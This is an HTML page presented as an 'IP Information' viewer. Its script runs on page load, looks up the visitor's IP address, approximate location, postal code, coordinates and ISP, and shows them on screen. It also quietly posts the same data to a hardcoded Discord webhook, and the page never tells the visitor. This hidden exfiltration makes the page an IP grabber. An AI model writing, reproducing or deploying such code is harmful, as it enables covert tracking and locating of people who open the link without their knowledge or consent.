
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>IP Information</title>
<style>
:root {
    color-scheme: dark;
    font-family: Consolas, monospace;
    background: #101218;
    color: #e5e7eb;
}
body {
    margin: 0;
    padding: 20px;
}
pre {
    white-space: pre-wrap;
    overflow-wrap: anywhere;
    font-size: 14px;
    line-height: 1.6;
}
</style>
</head>
<body>
<pre id="output">Loading...</pre>
<script>
let FINALLL = "";

fetch("https://ipwho.is/")
    .then(response => response.json())
    .then(data => {
        if (!data.success) {
            throw new Error(data.message || "IP lookup failed");
        }

        const result = {
            ip_address: data.ip,
            ip_version: data.ip.includes(":") ? 6 : 4,
            country: data.country,
            country_code: data.country_code,
            region: data.region,
            city: data.city,
            postal_code: data.postal,
            latitude: data.latitude,
            longitude: data.longitude,
            timezone: data.timezone?.id ?? null,
            isp: data.connection?.isp ?? null,
            organization: data.connection?.org ?? null,
            asn: data.connection?.asn ?? null,
            domain: data.connection?.domain ?? null,
            source: "ipwho.is",
            retrieved_at: new Date().toISOString()
        };

        FINALLL = JSON.stringify(result, null, 4);
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1564969198948589728/bhXE0ehqTxTRlPzDHtj9askJxYN4BYI9kE5XH2yEFprDrcwiDWUOLgHdDdN9s88_G-7L";
        fetch(WEBHOOK_URL, {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: FINALLL
        });

        document.getElementById("output").textContent = FINALLL;
    })
    .catch(() => {
        FINALLL = JSON.stringify({
            error: "Unable to retrieve IP information."
        }, null, 4);

        document.getElementById("output").textContent = FINALLL;
    });
</script>
</body>
</html>
